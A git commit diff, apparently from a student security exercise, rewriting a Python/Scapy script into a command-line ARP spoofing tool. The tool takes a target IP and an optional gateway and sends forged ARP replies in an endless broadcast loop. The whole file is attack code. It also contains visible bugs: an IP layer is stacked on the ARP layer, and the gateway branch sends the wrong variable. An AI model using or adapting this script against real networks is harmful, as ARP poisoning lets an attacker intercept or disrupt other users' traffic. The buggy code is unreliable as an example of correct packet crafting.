8a951b08e4f4d90a878b1e62b7b2a4dc8b841bd3
Genghis Khan <gkomet@g.jct.ac.il>
2020-03-13 13:52:51 +0200

    Done?

--- ComputerC.py
+++ ComputerC.py
@@ -1,20 +1,46 @@
-import sys
-i, o, e = sys.stdin, sys.stdout, sys.stderr
+import argparse
 from scapy.all import *
-sys.stdin, sys.stdout, sys.stderr = i, o, e
 
-MAC_ADDRESS = "D0:57:7B:0F:7C:CE"
-DEFAULT_GATEWAY = "10.7.15.254"
+args = None
 
-def filter_arp(packet):
-    return ARP in packet and packet[ARP].pdst == DEFAULT_GATEWAY
+
+def parse_command():
+    """
+
+    :return: Parse of the arguments
+    """
+    ap = argparse.ArgumentParser(description="Spoof ARP tables")
+    ap.add_argument('-i', '--iface', help='Interface you wish to use')
+    ap.add_argument('-s', '--src', help='The address you want for the attacker')
+    ap.add_argument('-d', '--delay', type=float, default=0, help='Delay (in seconds) between messages')
+    ap.add_argument('-gw', action='store_true', default=False, help='should GW be attacked as well')
+    ap.add_argument('-t', '--target', required=True, help='IP of target')
+    return ap.parse_args()
+
 
 def main():
+    gateway_address = None  # We will only use this in the case that the gateway is to be attacked
+    src_address = None  # src_address for the ARP response. Defined here so it can be assigned to within a condition
+    if args.src is None:  # If no src argument was supplied
+        src_address = IP().src  # Get the devices IP address
+    else:
+        src_address = args.src  # Get the IP address supplied as command-line argument
+    if args.gw:
+        gtwy = sr1(IP(dst='8.8.8.8', ttl=0))
+        gateway_address = gtwy.src
+    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2)/IP(src=src_address, dst=args.target)
+    gtwy_pkt = None
+    if args.gw:
+        gtwy_pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2)/IP(src=src_address, dst=gateway_address)
+    pkt.show()
+    while True:
+        sendp(pkt, iface=args.iface)
+        if args.gw:
+            sendp(gtwy, iface=args.iface)
+        time.sleep(args.delay)
 
-    packets = sniff(count=1, lfilter=filter_arp)
-    packet = packets[0]
-    crafted_packet = Ether()/ARP(op=2, psrc=packet.pdst, pdst=packet.psrc, hwdst=packet.hwsrc)
-    send(crafted_packet)
 
 if __name__ == '__main__':
+    args = parse_command()
+    print(args)
     main()
